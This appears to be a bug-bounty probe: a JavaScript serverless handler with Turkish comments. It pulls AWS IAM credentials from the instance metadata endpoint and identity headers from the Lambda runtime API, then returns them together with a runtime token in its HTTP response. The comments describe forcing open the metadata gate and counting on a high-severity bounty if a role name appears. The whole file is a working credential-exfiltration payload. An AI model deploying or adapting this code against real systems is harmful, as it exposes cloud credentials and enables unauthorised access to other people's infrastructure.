export default async function handler(req, res) {
  const sonuclar = {};
  
  try {
    // 1. AWS Metadata Kapısını Zorla (En Büyük Ödül Buradan Gelir)
    const awsCreds = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', { timeout: 1000 })
      .then(r => r.text()).catch(() => "Erişim Yok");
    
    // 2. 9001 Portundan "Identity" Bilgisi Çek
    const identity = await fetch(`http://${process.env.AWS_LAMBDA_METADATA_API}/2018-06-01/runtime/invocation/next`)
      .then(r => Object.fromEntries(r.headers)).catch(() => "Hata");

    res.status(200).json({
      durum: "Altyapı Analizi",
      aws_iam_role: awsCreds, // Eğer burada bir isim çıkarsa P1/P2 garanti!
      lambda_identity: identity['lambda-runtime-invoked-function-arn'],
      env_token: process.env.AWS_LAMBDA_METADATA_TOKEN
    });
  } catch (e) {
    res.status(200).json({ hata: e.message });
  }
}
